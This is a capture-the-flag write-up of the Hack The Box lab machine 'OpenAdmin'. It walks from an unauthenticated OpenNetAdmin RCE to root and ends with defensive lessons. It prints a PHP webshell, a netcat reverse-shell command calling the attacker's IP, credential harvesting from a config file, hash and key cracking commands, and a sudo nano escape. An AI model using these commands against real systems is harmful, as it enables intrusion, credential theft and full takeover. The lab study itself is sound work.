# HTB: OpenAdmin

**Difficulty:** Easy **OS:** Linux (Ubuntu 18.04) **Target IP:** 10.129.74.134 **Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### Port Scanning

```
nmap -p22,80 10.129.74.134 -sCV -oA nmap/nmap
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
```

Only SSH and a default, unconfigured-looking Apache page on port 80. A stock "It works" landing page usually means the real content lives under a subdirectory that isn't linked from the root, so directory/application discovery was the natural next step.

### Finding OpenNetAdmin

Browsing manually, `http://10.129.74.134/ona/` resolved to an instance of **OpenNetAdmin (ONA)** — an open-source IP address/network management tool — identifying itself as **version 18.1.1**. A specific, named, versioned application on an "Easy"-rated box is almost always the intended entry point, so I went straight to checking that version for known vulnerabilities rather than continuing broader enumeration.

---

## 2. Foothold — OpenNetAdmin 18.1.1 Unauthenticated RCE

### 2.1 Finding the Exploit

A quick search turned up a public unauthenticated RCE exploit for this exact version:

```
https://www.exploit-db.com/exploits/47691
```

OpenNetAdmin 18.1.1 is vulnerable to command injection through one of its unauthenticated AJAX endpoints (the tool insufficiently sanitizes user input before passing it to a PHP function that ends up executing it), meaning no credentials are needed at all to get code execution.

### 2.2 Running the Exploit

```bash
./exploit.sh http://10.129.74.134/ona/
```

```
$ whoami
www-data
$ pwd
/opt/ona/www
```

This dropped me into a semi-interactive shell as `www-data`, running from ONA's own web root (`/opt/ona/www`). To make follow-up work easier than driving everything through the exploit script, I used it to drop a simple PHP webshell directly into that writable web root:

```
$ echo '<?php system($_REQUEST["cmd"]); ?>' > rce.php
```

```
http://10.129.74.134/ona/rce.php?cmd=id
```
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 2.3 Upgrading to an Interactive Reverse Shell

With arbitrary command execution confirmed via a simple GET parameter, I used it to trigger a classic named-pipe netcat reverse shell:

```
http://10.129.74.134/ona/rce.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.15.146%20443%20%3E%2Ftmp%2Ff
```

With a listener already up:

```
nc -lvnp 443
```

```
connect to [10.10.15.146] from (UNKNOWN) [10.129.74.134] 42374
$ whoami
www-data
```

✅ **Foothold obtained** as `www-data`, with a proper interactive shell instead of a one-shot command box.

---

## 3. Lateral Movement — Database Credentials Lead to Jimmy

### 3.1 Finding ONA's Database Config

OpenNetAdmin, like most PHP applications backed by a database, keeps its DB connection details in a config file within the application directory. I located and read it:

```
cat /opt/ona/www/local/config/database_settings.inc.php
```

```php
'db_login' => 'ona_sys',
'db_passwd' => 'n1nj4W4rri0R!',
'db_database' => 'ona_default',
```

This is a database password, not a system password, but password reuse across a database account and an actual OS/service account is extremely common on these kinds of boxes — worth testing directly against any known usernames.

### 3.2 Testing Reuse Against SSH

`/etc/passwd` (or simply `ls /home`) showed a non-service user, `jimmy`. I tried the leaked database password directly against SSH for that account:

```bash
ssh jimmy@10.129.74.134
```

```
jimmy@10.129.74.134's password: n1nj4W4rri0R!
jimmy@openadmin:~$ whoami
jimmy
```

✅ Password reuse paid off immediately — a full interactive shell as `jimmy`.

---

## 4. Finding a Second, Internal-Only Web App

### 4.1 Checking Listening Ports

```
ss -tulnp
```

```
tcp  LISTEN  127.0.0.1:3306         (MySQL)
tcp  LISTEN  127.0.0.1:52846        (unidentified)
tcp  LISTEN  *:80                   (Apache, already seen)
```

Port `52846` bound only to localhost stood out — an internal-only service not reachable from outside the box, and not part of the public Apache instance I'd already enumerated. Getting to it required tunneling my own traffic through the SSH session I already had.

### 4.2 Tunneling In

```bash
ssh -L 52846:127.0.0.1:52846 jimmy@10.129.74.134
```

This forwards my local port `52846` through the SSH connection directly to `127.0.0.1:52846` on the target, letting me browse `http://localhost:52846/` on my own machine as if I were on the box itself.

### 4.3 Reading the Application Source First

Before touching the login page in a browser, I checked the internal app's files directly through my existing shell — `/var/www/internal/index.php` — since reading server-side PHP source is a far faster way to understand authentication logic than blind-guessing credentials:

```php
if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
```

The application hardcodes the username `jimmy` and compares the submitted password against a **hardcoded SHA-512 hash** right there in the source — meaning I had the full hash needed to crack the login password offline, with zero guessing or rate-limit risk.

### 4.4 Cracking the Hash

I submitted the hash to CrackStation, which resolved it against known hash databases and returned the plaintext. Using `jimmy` + the cracked password against the tunneled login page at `http://localhost:52846/` authenticated successfully and redirected to `main.php`.

### 4.5 Finding an RSA Private Key

`main.php` (only reachable after that authenticated redirect) displayed a passphrase-protected RSA private key in full:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,...
...
-----END RSA PRIVATE KEY-----
```

The `Proc-Type: 4,ENCRYPTED` header confirms this key is passphrase-protected — I couldn't use it for SSH directly without first recovering that passphrase.

---

## 5. Cracking the Key and Escalating to Joanna

### 5.1 Extracting a Crackable Hash from the Key

I saved the key locally and used `ssh2john` to convert it into a hash format John the Ripper can attack:

```bash
ssh2john id_rsa > pass
john --wordlist=/usr/share/wordlists/rockyou.txt pass
```

```
bloodninjas      (rsa)
1g 0:00:01:14 DONE
```

The key's passphrase cracked quickly against `rockyou.txt` — `bloodninjas`.

### 5.2 Identifying the Right User

Nothing in the key itself said whose account it belonged to, but given the earlier discovery that `/var/www/internal` served a second, gated application meant for a different user, and the box's structure clearly pointing toward more than one interactive account, the natural next step was to just try it against the other home directory present on the box — `joanna`:

```bash
ssh -i rsa joanna@10.129.74.134
```

```
Enter passphrase for key 'rsa': bloodninjas
joanna@openadmin:~$ whoami
joanna
```

✅ Correct — the key belonged to `joanna`, giving a second full interactive shell.

---

## 6. Privilege Escalation — Sudo `nano` Editor Escape

### 6.1 Checking Sudo Rights

```
sudo -l
```

```
User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Joanna can run `nano` as root, with no password, against a specific file (`/opt/priv`). This is a classic **GTFOBins**-style privilege escalation: `nano`, like many full-screen terminal editors, exposes internal functionality (searching, executing external commands, spawning a shell) that isn't blocked just because sudo restricts *which arguments* you pass — sudo only controls how the program is invoked, not what the program lets you do once it's running as root.

### 6.2 Escaping nano to a Root Shell

```bash
sudo /bin/nano /opt/priv
```

Once inside the editor (now running as root), I used nano's built-in command-execution feature, normally reached through its search/replace prompt:

- **Ctrl+R** — opens the "Read file into buffer" prompt, which also accepts a command to execute
- **Ctrl+X** — within that prompt, switches it into "execute a command" mode
- Typed: `reset; sh 1>&0 2>&0`
- **Enter** — runs the command

`reset` clears/reinitializes the terminal (nano leaves it in a slightly unusual state that this fixes), and `sh 1>&0 2>&0` spawns a shell with its stdout and stderr redirected back onto the current terminal, giving a fully interactive shell — running with whatever privilege nano itself was running under, which was root.

```
# /bin/bash -p
root@openadmin:/home/joanna# whoami
root
```

✅ **Full compromise** — root shell obtained by abusing a NOPASSWD sudo rule on `nano` to spawn a root-owned interactive shell from within the editor.

---

## 7. Summary

| Stage | Technique |
|---|---|
| Recon | `nmap` → SSH + Apache; manual browsing found an OpenNetAdmin instance at `/ona/`, version 18.1.1 |
| Foothold | Public unauthenticated RCE exploit for OpenNetAdmin 18.1.1 → shell as `www-data`; planted a simple PHP webshell for a stable reverse shell |
| Credential reuse | Read ONA's DB config (`database_settings.inc.php`) → the DB password was reused directly as `jimmy`'s SSH password |
| Internal app discovery | `ss -tulnp` found a localhost-only web app on port 52846; tunneled it via `ssh -L` |
| Auth bypass via source reading | Read `/var/www/internal/index.php` directly through the shell, finding a hardcoded SHA-512 password hash for `jimmy` baked into the login logic |
| Hash cracking | Cracked the SHA-512 hash via CrackStation, logged into the internal app, and found a passphrase-protected RSA private key on `main.php` |
| Key cracking | `ssh2john` + `john` (rockyou.txt) recovered the key's passphrase (`bloodninjas`) |
| Lateral move | Used the cracked key to SSH in as `joanna` |
| Privesc | `sudo -l` showed NOPASSWD `/bin/nano /opt/priv`; escaped nano's command-execution prompt (Ctrl+R, Ctrl+X) to spawn a root shell |

**Root cause / lessons learned:**

- Running an outdated, publicly-vulnerable version of a management tool (OpenNetAdmin 18.1.1) with an unauthenticated RCE gave immediate code execution — patching known CVEs promptly is the single highest-value control here.
- Application config files routinely contain plaintext credentials, and those credentials are frequently **reused** across a database account and a real OS/service account — a single leaked DB password directly became SSH access.
- Hardcoding a password hash (even a strong one like SHA-512) directly in application source code is a serious weakness the moment an attacker can read that source — proper authentication should validate against a secrets store or a salted, per-deployment secret, not a hash baked into version-controlled code.
- Sudo rules that grant NOPASSWD access to interactive, full-featured programs (editors, pagers, debuggers) are almost always exploitable, because sudo can restrict the command *path* but not what that program is capable of doing once running — GTFOBins documents this pattern extensively across `nano`, `vim`, `less`, `awk`, and many others. Sudo rules should only ever target purpose-built, minimal-functionality binaries for exactly this reason.

---

## 8. Tools Used

- `nmap` — reconnaissance
- **OpenNetAdmin 18.1.1 RCE exploit** (`exploit.sh`, from Exploit-DB #47691) — unauthenticated initial foothold
- `nc` — reverse shell listener
- SSH local port forwarding (`ssh -L`) — reaching the internal-only web application on port 52846
- CrackStation — cracking the hardcoded SHA-512 password hash
- `ssh2john` + `john` (rockyou.txt) — recovering the encrypted RSA private key's passphrase
- `nano` (via sudo misconfiguration) — final privilege escalation to root
